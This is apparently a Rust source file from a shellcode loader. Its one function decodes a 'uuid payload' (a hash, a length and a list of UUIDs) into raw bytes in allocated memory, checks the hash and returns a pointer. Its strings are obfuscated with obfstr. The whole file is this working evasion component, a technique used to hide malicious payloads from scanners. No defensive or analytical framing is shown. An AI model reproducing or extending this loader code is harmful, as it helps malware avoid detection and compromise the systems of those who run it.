use crate::alloc::alloc;
use obfstr::obfstr;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    use sha2::{Sha256, Digest};
    use obfstr::obfstr;
    let data_str = std::str::from_utf8(decoded).map_err(|_| obfstr!("invalid utf8").to_string())?;
    let parts: Vec<&str> = data_str.split(',').collect();
    if parts.len() < 3 {
        return Err(obfstr!("uuid payload format invalid").to_string());
    }
    let hex_hash = parts[0];
    let length_str = parts[1];
    let uuids_str = parts[2..].join(",");
    let hash = hex::decode(hex_hash).map_err(|_| obfstr!("invalid hex hash").to_string())?;
    if hash.len() != 32 {
        return Err(obfstr!("hash length mismatch").to_string());
    }
    let original_len: usize = length_str.parse().map_err(|_| obfstr!("invalid length").to_string())?;
    let padded_len = ((original_len + 15) / 16) * 16;
    let uuids: Vec<&str> = uuids_str.split(',').collect();
    let p = unsafe { alloc(padded_len)? };
    let buf = std::slice::from_raw_parts_mut(p, padded_len);
    let mut idx = 0;
    for uuid_str in uuids {
        let u = uuid::Uuid::parse_str(uuid_str).map_err(|_| obfstr!("Invalid UUID").to_string())?;
        let bytes = u.as_bytes();
        for &b in bytes {
            if idx >= padded_len { break; }
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..padded_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obfstr!("uuid hash mismatch").to_string());
    }
    Ok((p as usize, original_len))
}